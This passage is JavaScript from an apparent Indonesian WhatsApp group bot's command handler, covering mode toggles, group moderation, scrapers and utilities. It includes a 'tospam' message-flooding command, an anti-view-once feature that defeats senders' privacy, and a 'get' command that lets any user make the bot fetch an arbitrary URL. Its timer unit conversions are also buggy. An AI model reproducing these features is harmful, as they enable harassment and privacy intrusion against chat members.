           if (publik === true) return reply('*Udah di mode publick kak*')
           publik = true
           let bab =`Mode public aktif kak`
           xdev.sendMessage(from, bab, text, { quoted: ftext, contextInfo: forward})
           break
           
case 'self':
                 if (!isOwner) return sendSticker(gaboleh, sticker)
           if (publik === false) return reply('*Udah di mode self kak*')
           publik = false
           let breh =`Mode self aktif kak`
           xdev.sendMessage(from, breh, text, { quoted: fmenu1, contextInfo: forward})
           break
           
           
           case 'welcome':
                    if(isExtream) return
					if (!isGroup) return reply('hanya bisa di group')
					if ((args[0]) === 'on') {
						if (isWelkom) return reply('Fitur welcome sudah aktif kak')
						welkom.push(from)
						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
						let ih =`Fitur welcome telah aktif\nsilakan restart bot melalui termux\n\ctrl z lalu npm start`
                    xdev.sendMessage(from, ih, text, { quoted: ftext, contextInfo: forward})
					} else if ((args[0]) === 'off') {
						if (!isWelkom) return reply('Udah mati')
						welkom.splice(from, 1)
						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
						let ih =`Fitur welcome telah di matikan\nsilakan restart bot melalui termux\n\ctrl z lalu npm start`
                    xdev.sendMessage(from, ih, text, { quoted: ftext, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE WELCOME`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}welcome on`, buttonText: {displayText: `on`,},type: 1},
                      {buttonId: `${prefix}welcome off`, buttonText: { displayText: `off`,},type: 1}]);
                    }
                 break;
          
           
           
					case 'autoread':
					       if (!isOwner) return sendSticker(gaboleh, sticker)
					if ((args[0]) === 'on') {
					if (autoread === true) return jawab('*Udah aktif kak*')
                    autoread = true
                    let ih =`Mode auto read telah aktif kak \nBot akan auto read saat di chat`
                    xdev.sendMessage(from, ih, text, { quoted: ftext, contextInfo: forward})
					} else if ((args[0]) === 'off') {
					 if (autoread === false) return jawab('*Udah off kak*')
                     autoread = false
                     let eh =`Mode auto read telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: fmenu1, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTOREAD`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autoread on`, buttonText: {displayText: `on`,},type: 1},
                      {buttonId: `${prefix}autoread off`, buttonText: { displayText: `off`,},type: 1}]);
                    }
                 break;
					
					
					case 'autovn':
					       if (!isOwner) return sendSticker(gaboleh, sticker)
					if ((args[0]) === 'on') {
					if (autovn === true) return jawab('*Udah aktif kak*')
                    autovn = true
                    let ih =`Mode auto vn telah aktif kak \nBot akan auto voice saat di kasih perintah`
                    xdev.sendMessage(from, ih, text, { quoted: ftext, contextInfo: forward})
					} else if ((args[0]) === 'off') {
					 if (autovn === false) return jawab('*Udah off kak*')
                     autovn = false
                     let eh =`Mode auto vn telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: fmenu1, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTO VOICE NOTE`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autovn on`, buttonText: {displayText: `on`,},type: 1},
                      {buttonId: `${prefix}autovn off`, buttonText: { displayText: `off`,},type: 1}]);
                    }
                 break;
                 
                 
                 
                 case 'autosticker':
					       if (!isOwner) return sendSticker(gaboleh, sticker)
					if ((args[0]) === 'on') {
					if (autosticker === true) return jawab('*Udah aktif kak*')
                    autosticker = true
                    let ih =`Mode autosticker telah aktif kak`
                    xdev.sendMessage(from, ih, text, { quoted: ftext, contextInfo: forward})
					} else if ((args[0]) === 'off') {
					 if (autosticker === false) return jawab('*Udah off kak*')
                     autosticker = false
                     let eh =`Mode autosticker telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: fmenu1, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTOSTICKER`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autosticker on`, buttonText: {displayText: `on`,},type: 1},
                      {buttonId: `${prefix}autosticker off`, buttonText: { displayText: `off`,},type: 1}]);
                    }
                 break;
					
					
					
					case 'autorespon':
      if (!isOwner && !dev.key.fromMe) return reply('Ga boleh')
           if (c === 'on'){
              autorespon = false
                    reply(`Berhasil mengaktifkan autorespon`)
                } else if (c === 'off'){
                    autorespon = true
                    reply(`Berhasil menonaktifkan autorespon`)
                } else if (!q) {
                      sendButMessage(from, `MODE AUTO RESPON`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autorespon on`, buttonText: {displayText: `on`,},type: 1},
                      {buttonId: `${prefix}autorespon off`, buttonText: { displayText: `off`,},type: 1}]);
                    }
                 break;
					
		case "antihidetag":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins) return sendSticker(hanyaadmin, sticker)
		if (!isBotGroupAdmins) return sendSticker(jadiinadmin, sticker)
        if (args[0] == "on") {
          if (isAntihidetag) return reply("Sudah aktif!!");
          antihidetg.push(from);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mengaktifkan antihidetag!");
        } else if (args[0] == "off") {
          antihidetg.splice(from, 1);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mematikan antihidetag!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIHIDETAG`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antihidetag on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antihidetag off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
					
					
					
					
					
					case 'antivo':
					     if(isExtream) return
          if (args[0] == "on") {
          Antivo = true 
          if (isAntiviewonce) return reply("Sudah aktif!!");
          antivo.push(from);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Sukses mengaktifkan antiviewonce!");
        } else if (args[0] == "off") {
           Antivo = false 
          if (!isAntiviewonce) return reply("Sudah mati!!");       
          antivo.splice(from, 1);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Sukses mematikan antiviewonce!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTI VIEW ONCE`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antivo on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antivo off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
					
					
					
					
					
					
					case 'autotyping':
					case 'typing':
					       if (!isOwner) return sendSticker(gaboleh, sticker)
					if ((args[0]) === 'on') {
					if (typing === true) return jawab('*Udah aktif kak*')
                    typing = true
                    let ah =`Mode typing telah aktif kak \nBot akan auto typing saat di beri perintah`
                    xdev.sendMessage(from, ah, text, { quoted: ftext, contextInfo: forward})
					} else if ((args[0]) === 'off') {
					 if (typing === false) return jawab('*Udah off kak*')
                     typing = false
                     let uh =`Mode typing telah di matikan`
                     xdev.sendMessage(from, uh, text, { quoted: fmenu1, contextInfo: forward})
					} else if (!q) {
                      sendButMessage(from, `MODE AUTO TYPING`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autotyping on`, buttonText: {displayText: `on`,},type: 1},
                      {buttonId: `${prefix}autotyping off`, buttonText: { displayText: `off`,},type: 1}]);
                    }
                 break;
                 
                 
                 case 'forward':
					       if (!isOwner) return sendSticker(gaboleh, sticker)
					if ((args[0]) === 'on') {
					if (forwarding === true) return jawab('*Udah aktif kak*')
                    forwarding = true
                    let ah =`Mode forwarding/diteruskan berhasil diaktifkan \nsilakan ketik ${prefix}menu untuk melihat perbedaanya`
                    xdev.sendMessage(from, ah, text, { quoted: ftext, contextInfo: forward})
					} else if ((args[0]) === 'off') {
					 if (forwarding === false) return jawab('*Udah off kak*')
                     forwarding = false
                     let uh =`Mode forwarding telah di matikan`
                     xdev.sendMessage(from, uh, text, { quoted: fmenu1, contextInfo: forward})
					} else if (!q) {
                      sendButMessage(from, `MODE AUTO TYPING`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}forwarding on`, buttonText: {displayText: `on`,},type: 1},
                      {buttonId: `${prefix}forwarding off`, buttonText: { displayText: `off`,},type: 1}]);
                    }
                 break;
                 
                 
                 case "antibuggc":
                      if(isExtream) return
if (!isGroup) return reply('Kusus group')
        if (args[0] == "on") {
      if (Antibuggc) return reply('Sudah Aktif')
          antibug.push(from);
          fs.writeFileSync(
            "./database/antibug.json",
            JSON.stringify(antibug)
          );
          reply("Sukses mengaktifkan antibuggc di grub ini!");
        } else if (args[0] == "off") {
        if (!Antibuggc) return reply('Sudah Mati')
          antibug.splice(from, 1);
          fs.writeFileSync("./database/antibug.json", JSON.stringify(antibug));
          reply("Sukses mematikan antibuggc!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTIBUGGC`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antibuggc on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antibuggc off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
        
                 
           
           case 'antitroli':
                if(isExtream) return
					       if (!isOwner) return sendSticker(gaboleh, sticker)
					if ((args[0]) === 'on') {
					if (antibugtroli === true) return jawab('Sudah aktif kak')
                    antibugtroli = true
                    let ah =`Mode anti bugtroli aktif kak`
                    xdev.sendMessage(from, ah, text, { quoted: ftext, contextInfo: forward})
					} else if ((args[0]) === 'off') {
					 if (antibugtroli === false) return jawab('*Udah off kak*')
                     antibugtroli = false
                     let uh =`Mode anti bugtroli di matikan`
                     xdev.sendMessage(from, uh, text, { quoted: fmenu1, contextInfo: forward})
					} else if (!q) {
                      sendButMessage(from, `MODE ANTI BUGTROLI`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antitroli on`, buttonText: {displayText: `on`,},type: 1},
                      {buttonId: `${prefix}antitroli off`, buttonText: { displayText: `off`,},type: 1}]);
                    }
                 break;
           
           
           
           case 'modewar':
					case 'warmode':
					       if (!isOwner) return sendSticker(gaboleh, sticker)
					if ((args[0]) === 'on') {
					if (isWarmode) return reply('Warmode sudah aktif kak !!!')
					    warmode.push(from)
					fs.writeFileSync('./database/warmode.json', JSON.stringify(warmode))
					sendFakeStatus(from, `*WAR MODE IS ACTIVATED*`, fake)
					} else if ((args[0]) === 'off') {
					if (!isWarmode) return reply('Warmode sudah off kak !!!')
						var ini = warmode.indexOf(from)
						warmode.splice(ini, 1)
						fs.writeFileSync('./database/warmode.json', JSON.stringify(warmode))
						sendFakeStatus(from, `*DEACTIVATED WAR MODE*`, fake)
					} else if (!q) {
                      sendButMessage(from, `MODE WAR`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}warmode on`, buttonText: {displayText: `on`,},type: 1},
                      {buttonId: `${prefix}warmode off`, buttonText: { displayText: `off`,},type: 1}]);
                    }
                 break;
           
           
           
           case 'setprefix':
                     if (!isOwner) return sendSticker(gaboleh, sticker)
                if (args.length < 1) return reply(`Masukkan prefix\nOptions :\n=> multi\n=> nopref`)
                if (c === 'multi'){
                    multi = true
                    sendFakeStatus(from, `Berhasil mengubah prefix ke「 ${c} 」`, fake)
                } else if (c === 'nopref'){
                    multi = false
                    nopref = true
                    sendFakeStatus(from, `Berhasil mengubah prefix ke「 ${c} 」`, fake)
                } else {
                    multi = false
                    nopref = false
                    prefa = `${c}`
                    sendFakeStatus(from, `Berhasil mengubah prefix ke「 ${c} 」`, fake)
                }
                break
                
                
           
           case 'ocr': 
				    if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
						const yamampun = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
						const media = await xdev.downloadAndSaveMediaMessage(yamampun)
						reply('wait')
						await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
							.then(teks => {
								reply(teks.trim())
								fs.unlinkSync(media)
							})
							.catch(err => {
								reply('eor')
								fs.unlinkSync(media)
							})
					} else {
						reply(`kirim gambar bertulisan english dengan caption ${prefix + command}`)
					}
					break

           
           
           
           case 'delchat':
               if (!isOwner) return sendSticker(gaboleh, sticker)
                aw = ('*succes delete this chat*')
                console.log(color('[succes delete chat =]','gold')+ color('dari', 'cyan'), color(`${pushname}`, 'purple'))
                xdev.modifyChat(from, ChatModification.delete)
                setTimeout( () => {
                xdev.sendMessage(from, aw, text)
                },3000)
                break
           
           case 'closetime': 
				if (!isGroupAdmins) return sendSticker(hanyaadmin, sticker)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin, sticker)
              if (args[1]=="detik") {var timer = args[0]+"000"
				} else if (args[1]=="menit") {var timer = args[0]+"0000"
				} else if (args[1]=="jam") {var timer = args[0]+"00000"
				} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
				setTimeout( () => {
					var nomor = dev.participant
					const close = {
					text: `*Tepat waktu* grup ditutup oleh admin  @${nomor.split("@s.whatsapp.net")[0]}\sekarang hanya admin yang dapat mengirim pesan`,
					contextInfo: { mentionedJid: [nomor] }
					}
					xdev.groupSettingChange (from, GroupSettingChange.messageSend, true);
					reply(close)
				}, timer)
				break
				
case 'opentime': 
					       
			if (!isGroupAdmins) return sendSticker(hanyaadmin, sticker)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin, sticker)
              if (args[1]=="detik") {var timer = args[0]+"000"
				} else if (args[1]=="menit") {var timer = args[0]+"0000"
				} else if (args[1]=="jam") {var timer = args[0]+"00000"
				} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
				setTimeout( () => {
					var nomor = dev.participant
					const open = {
					text: `*Tepat waktu* grup dibuka oleh admin @${nomor.split("@s.whatsapp.net")[0]}\n sekarang member dapat mengirim pesan`,
					contextInfo: { mentionedJid: [nomor] }
					}
					xdev.groupSettingChange (from, GroupSettingChange.messageSend, false);
					reply(open)
				}, timer)
				break


           
           
            
            
            case 'getpp':
					if (!isGroup) return 
					kicknya = dev.message.extendedTextMessage.contextInfo.participant
					  try {
                     pic = await xdev.getProfilePicture(kicknya)
                      } catch {
                       pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
                      }
                    onichan = await getBuffer(pic)
				xdev.sendMessage(from, onichan, image, {quoted: floc2})
                      break
            
            case 'getfp':
               if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
               linkpp = await xdev.getProfilePicture(from) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
               buffer = await getBuffer(linkpp)
               xdev.sendMessage(from, buffer, image, {caption: "Nih", quoted: dev })
               } else if (dev.message.extendedTextMessage.contextInfo.mentionedJid === null || dev.message.extendedTextMessage.contextInfo.mentionedJid === undefined) {
               mberr = dev.message.extendedTextMessage.contextInfo.participant
               linkpp = await xdev.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
               buffer = await getBuffer(linkpp)
               xdev.sendMessage(from, buffer, image, { quoted: dev, caption: `Profile Picture of @${mberr.split("@")[0]}`, contextInfo: { "mentionedJid": [mberr] }})
               } else if (dev.message.extendedTextMessage.contextInfo.mentionedJid.length > 0) {
               mberr = dev.message.extendedTextMessage.contextInfo.mentionedJid[0]
               linkpp = await xdev.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
               buffer = await getBuffer(linkpp)
               xdev.sendMessage(from, buffer, image, { quoted: dev, caption: `Profile Picture of @${mberr.split("@")[0]}`, contextInfo: { "mentionedJid": [mberr] }})
               }
               break
            
           
           
           
           
           
case 'listban':
case 'banlist':
//Fix By M4N1K
teks = '*Nih kak daftar nomer yang bikin beban :*\n\n'
for (let awokwkwk of ban) {
teks += `- ${awokwkwk}\n`
}
teks += `\n *Total ada : ${ban.length}*`
xdev.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: forward })
break


           
           

           
           
case 'tospam':
if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return reply('Reply targetnya!')
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  xdev.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = dev.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  xdev.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await xdev.downloadAndSaveMediaMessage(encmedian)
				ara = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  xdev.sendMessage(from, ara, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await xdev.downloadAndSaveMediaMessage(encmediat)
				ara = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  xdev.sendMessage(from, ara, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
	delb = await xdev.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  xdev.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
           
           
           
           
           
           
           
           
           
           
           
    case 'delvote':
            if(!dev.key.remoteJid) return
            if(isVote) return reply('Tidak ada sesi Voting')
            delVote(from)
            reply('Sukses Menghapus sesi Voting Di Grup Ini')
            break
    case 'voting':
            if(!isGroupAdmins && !dev.key.fromMe) return 
            if(!isGroup) return reply(mess.only.group)
            if (isVote) return reply('Sesi Voting Sedang Berlangsung Di Grup Ini')
            if(!q) return reply('*Voting*\n\n'+ prefix+ 'voting @tag target | reason  | 1 (1 = 1 Menit)')
            if (dev.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || dev.message.extendedTextMessage.contextInfo == null) {
            let id = dev.message.extendedTextMessage.contextInfo.mentionedJid[0]
            split = args.join(' ').replace('@', '').split('|')
            if(!Number(split[2])) return reply('masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit')
            await mentions('Vote ' +'@'+ id.split('@')[0]+' Di Mulai' +'\n\n' + `ketik vote untuk setuju \n ketik devote untuk tidak setuju\n-Huruf kecil semua\n\nvote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,[id],true)
            addVote(from,split[1],split[0],split[2],reply)
            }
            break
    case 'linkwa':
            if(!q) return reply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '*「 _LINK WA_ 」*\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break
    case 'igstory': 
            if(!q) return reply('Usernamenya?')
            hx.igstory(q)
            .then(async result => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    xdev.sendMessage(from,link,video,{quoted: dev,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    xdev.sendMessage(from,link,image,{quoted: dev,caption: `Type : ${i.type}`})                  
                }
            }
            });
            break
    case 'caripesan':
            if(!q)return reply('pesannya apa bang?')
            let v = await xdev.searchMessages(q,from,10,1)
            let s = v.messages
            let el = s.filter(v => v.message)
            el.shift()
            try {
            if(el[0].message.conversation == undefined) return
            reply(`Ditemukan ${el.length} pesan`)
            await sleep(3000)
            for(let i = 0; i < el.length; i++) {
            await xdev.sendMessage(from,'Nih pesannya',text,{quoted:el[i]})
            }
            } catch(e){
            reply('Pesan tidak ditemukan!')
            }           
            break
            
       /*     
    case 'lirik':
if (args.length < 1) return reply('Judulnya?')
reply(mess.wait)
teks = body.slice(7)
lirikLagu(teks).then((res) => {
let lirik = `${res[0].result}`
reply(lirik)
})
break
    */        
            
            
    case 'otaku':
            if(!q) return reply('judul animenya?')
            let anime = await hx.otakudesu(q)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
            xdev.sendMessage(from,ram,image,{quoted:dev,caption:rem})
            break
         


/*   
    case 'komiku':
            if(!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`)
            let komik = await hx.komiku(q)
            result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
            sendMediaURL(from, komik.image,result)
            break
     */       
				
				
				
    case 'chara':
            if(!q) return reply(`gambar apa?\n${prefix}chara nino`)
            let im = await hx.chara(q)
            let acak = im[Math.floor(Math.random() * im.length)]
            let li = await getBuffer(acak)
            await xdev.sendMessage(from,li,image,{quoted: dev})
            break
     




case 'darkjokes':
reply(mess.wait)
					data = fs.readFileSync('./lib/darkjokes.js');
					jsonData = JSON.parse(data);
					randIndex = Math.floor(Math.random() * jsonData.length);
					randKey = jsonData[randIndex];
					hasil = await getBuffer(randKey.result)
					xdev.sendMessage(from, hasil, image, {quoted: ftroli, caption: '*GELAP BOS :V*'})
				break
    case 'pinterest':
        
            if(!q) return reply('gambar apa?')
            reply(mess.wait)
            let pin = await hx.pinterest(q)
            let ac = pin[Math.floor(Math.random() * pin.length)]
            let di = await getBuffer(ac)
            await xdev.sendMessage(from,di,image,{quoted: dev})
            break
    case 'playstore':
            if(!q) return reply('lu nyari apa?')
            let play = await hx.playstore(q)
            let store = '❉─────────────────────❉\n'
            for (let i of play){
            store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`
            }
            reply(store)
            break
    case 'on':
            if (!dev.key.fromMe && !isOwner) return 
            offline = false
            fakestatus(' ```ANDA TELAH ONLINE``` ')
            break       
    case 'statuson':
            fakestatus(`*STATUS*\n${offline ? '> OFFLINE' : '> ONLINE'}\n${banChats ? '> SELF-MODE' : '> PUBLIC-MODE'}`)
            break
    case 'off':
           // if (!isOwner) return sendSticker(gaboleh, sticker)
            if(!q) return reply ("Alasanya apa kak ?")
            if (!dev.key.fromMe && !isOwner) return 
            offline = true
            waktu = Date.now()
            anuu = q ? q : '-'
            alasan = anuu
            fakestatus(`Anda telah offline dengan alasan ${q}`)
            break   
    case 'get':
            if(!q) return reply('linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            fakestatus(bu)
            })   
            break
     



case 'google':
              if (!q) return reply('masukan teks')
              if(q == undefined || q == ' ') return reply(`*Hasil Pencarian : ${q}* tidak ditemukan`)
              ggs({ 'query': q }).then(results => {
              vars =``
              vars += `_*Hasil Pencarian : ${q}*_\n`
              for (let i = 0; i < results.length; i++) {
              vars +=  `\n═════════════════\n\n*Judul:* ${results[i].title}\n\n*Deskripsi:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
}
var lama = vars.trim()
               xdev.sendMessage(from, lama, text, {quoted : dev })
               })
               break

case "antilink":

    if (!isGroup) return reply('Kusus group')
if (!isGroupAdmins) return sendSticker(hanyaadmin, sticker)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin, sticker)
        if (args[0] == "on") {
          if (isAntiLink) return reply("Sudah aktif!!");
          antilink.push(from);
          fs.writeFileSync("./database/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Sukses mengaktifkan antilink!");
        } else if (args[0] == "off") {
          antilink.splice(from, 1);
          fs.writeFileSync(
            "./database/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Sukses mematikan antilink!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTILINK`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antilink on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antilink off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;




					
					
					case "antivirtex":
					     if(isExtream) return
if (!isGroup) return reply('Kusus group')
        if (args[0] == "on") {
      if (AntiVirtex) return reply('Sudah Aktif')
          antivirtex.push(from);
          fs.writeFileSync(
            "./database/antivirtex.json",
            JSON.stringify(antivirtex)
          );
          reply("Sukses mengaktifkan antivirtex!");
        } else if (args[0] == "off") {
        if (!AntiVirtex) return reply('Sudah Mati')
          antivirtex.splice(from, 1);
          fs.writeFileSync("./database/antivirtex.json", JSON.stringify(antivirtex));
          reply("Sukses mematikan antivirtex!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTIVIRTEX`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antivirtex on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antivirtex off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
        
        
        case "kickarea":
        case "antiasing":
      if (!isGroup) return reply('Kusus group')
if (!isGroupAdmins) return sendSticker(hanyaadmin, sticker)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin, sticker)
        if (args[0] == "on") {
          if (isKickarea) return reply("Sudah aktif!!");
          kickarea.push(from);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mengaktifkan kickarea!");
        } else if (args[0] == "off") {
          kickarea.splice(from, 1);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mematikan kickarea!");
        } else if (!q) {
          sendButMessage(from, `MODE KICKAREA`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}kickarea on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}kickarea off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
					
					
					
					
					
					


case 'add':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return sendSticker(hanyaadmin, sticker)
			        if (!isBotGroupAdmins) return sendSticker(jadiinadmin, sticker)
					
						if (args.length < 1) {
                       asu = dev.message.extendedTextMessage.contextInfo.participant  
                      await xdev.groupAdd(from, [asu])
                      await xdev.sendMessage(from,`Berhasil menambahkan @${asu.split("@")[0]} ke dalam group ${groupName}`,text);          
                      } else {
                       if (args[0].startsWith('+62')) return reply('Awali nomor dengan 62')
                       if (args[0].startsWith('08')) return reply('Gunakan kode negara kak')
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						await xdev.groupAdd(from, [num])
						await xdev.sendMessage(from,`Berhasil menambahkan ${q} ke dalam group ${groupName}`,text);          
						}
					break
					
					
					case 'setnamebot':
					if(!isOwner) return reply('Ga mau')
					reply(`Berhasil mengubah nama bot ke ${q}`)
					fake = `${q}`
					break
					
					case 'forwardtotal':
					case 'totalforward':
					if(forwarding === false) return reply("Aktifkan fitur forward")
					if(!isOwner) return reply('Ga mau')
					if(!q) return reply(`Jumlah forwardnya berapa kak\ncontoh : 1, 100, 1000, 100000`)
					reply(`Berhasil mengubah total forward ke ${q}`)
					totalForward = `${q}`
					break
					
case 'kick':
if (!isGroupAdmins) return sendSticker(hanyaadmin, sticker)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin, sticker)
if (!isGroup) return
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return jawab('Reply targetnya kak')
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return reply(`*Ya jangan lebih dari satu dong kak ${pushname} nanti aku kena banned* 😒`)
if (mentioned.length < 1) {
asu = dev.message.extendedTextMessage.contextInfo.participant
if(dev.message.extendedTextMessage === ownerNumber[0]) return reply('Tidak bisa kick owner')
reply( `*Modar kena kick awokawok* 🤣`);
await xdev.groupRemove(from, [asu])
} else {
if (mentioned.includes(ownerNumber[0])) return reply(`Tidak bisa kick Owner`)
if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return reply(`Tidak bisa kick owner group`)
reply(`*Asek dapet jatah kick, Otw kick* 😎`);
await xdev.groupRemove(from, [mentioned[0]])
 }
break    

case 'kick1':
					if (!isGroupAdmins) return sendSticker(hanyaadmin, sticker)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin, sticker)
if (!isGroup) return
